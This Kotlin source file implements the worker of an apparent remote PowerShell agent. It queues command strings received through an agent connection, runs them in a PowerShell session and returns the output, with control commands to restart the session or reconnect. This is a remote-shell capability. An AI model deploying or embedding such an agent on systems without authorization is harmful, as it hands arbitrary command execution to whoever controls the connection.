package com.tobias.kposhagent

import com.profesorfalken.jpowershell.PowerShell
import com.profesorfalken.jpowershell.PowerShellNotAvailableException
import com.profesorfalken.jpowershell.PowerShellResponse
import com.tobias.kposhagent.command.Command
import com.tobias.kposhagent.command.CommandType
import java.lang.IllegalArgumentException
import java.util.*

class PowerShellWorker(private val agent : Agent) : Runnable{
    private val queue = LinkedList<Command>()
    private var ps : PowerShell = PowerShell.openSession()


    override fun run() {
        while (!Thread.interrupted()) {
            while (queue.isEmpty()) {
                Thread.sleep(100)
            }
            println("queue size: ${queue.size}")
            println("received: ${queue[0]}")
            agent.write(handleCommand(queue[0]))
            queue.removeAt(0)
        }
    }

     fun process(cmd : String) {
        queue.add(parseCommand(cmd))

    }
    private fun executePowerShell(command: Command) : String {
        return try {
            val response : PowerShellResponse = ps.executeCommand(command.cmd)
            response.commandOutput
        } catch (ex : PowerShellNotAvailableException) {
            "NO_PSH: $ex"
        }
    }

    private fun handleCommand(command : Command) : Command {

        return when(command.cmd.startsWith("!")) {
            true -> Command(handleAgentCommand(command),CommandType.RESPONSE_AGENT)
            false -> Command(executePowerShell(command), CommandType.RESPONSE_POWERSHELL)
            //.joinToString(",","[","]")
        }
    }
    private fun handleAgentCommand(command: Command) : String {
        return when(command.cmd) {
            // Start new PowerShell session
            "!rs" -> {
                try {
                    ps = PowerShell.openSession()
                    // Return confirmation that new session was created
                    "OK"
                } catch (ex: PowerShellNotAvailableException) {
                 "RESTART FAIL: $ex"
                }
            }
            "!rc" -> {
                agent.reconnect()
                "OK"
            }
            else -> {
                // todo implement else
                return ""}
        }
    }
    private fun parseCommand(cmd : String) : Command {
        var cmdType = CommandType.UNKNOWN
        var data = ""
        try {
            cmdType = CommandType.valueOf(cmd. substringAfterLast(":").trim())
            data = cmd.substring(cmd.indexOf("CMD:") + 4, cmd.indexOf("TYPE:") - 1)
        } catch (ex: IllegalArgumentException) {
            // TODO logging
            println("Error parsing command")
        }
        return Command(data,cmdType)
    }
}